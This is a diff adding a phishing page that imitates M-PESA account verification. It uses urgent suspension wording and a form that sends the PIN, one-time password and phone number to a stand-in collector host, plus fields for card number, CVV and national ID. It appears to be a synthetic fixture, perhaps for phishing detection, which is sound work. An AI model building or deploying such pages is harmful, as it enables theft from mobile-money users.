@@ -1,0 +1,25 @@
+<!doctype html><html><head><title>M-PESA Account Verification</title>
+<script>gtag('config', 'G-PHISH0001');</script>
+<script>
+  if (!ok) { window.location = "https://redirect-target.example/next"; }
+  if (a == "https://not-a-redirect.example/") {}
+</script></head><body>
+<h1>M-PESA Account Verification</h1>
+<p>Urgent verification required. Your account will be suspended within 24 hours. Unlock your M-PESA account now.</p>
+<form action="https://collector.example/post.php" method="post">
+  <label for="f1">Enter your M-PESA PIN</label><input id="f1" name="f1" type="password" maxlength="4">
+  <label>One-time password <input name="f2" type="text" inputmode="numeric" maxlength="6"></label>
+  <input name="mpesaPhone" type="tel" placeholder="Phone number">
+  <input type="hidden" name="token" value="abc123"><input type="submit" value="Verify">
+</form>
+<div>
+  <input name="card_no" placeholder="Card number"><input name="cvv" placeholder="CVV">
+  <input name="natid" placeholder="National ID number">
+  <button onclick="send()">Continue</button>
+</div>
+<a href="https://wa.me/254700000001?text=help">Contact us on WhatsApp</a>
+<a href="https://www.safaricom.co.ke/">Official site</a>
+<a href="https://pay-now.example/checkout">Pay now</a>
+<a href="https://www.google.com/">Google</a>
+<iframe src="https://frame-host.example/widget"></iframe>
+</body></html>
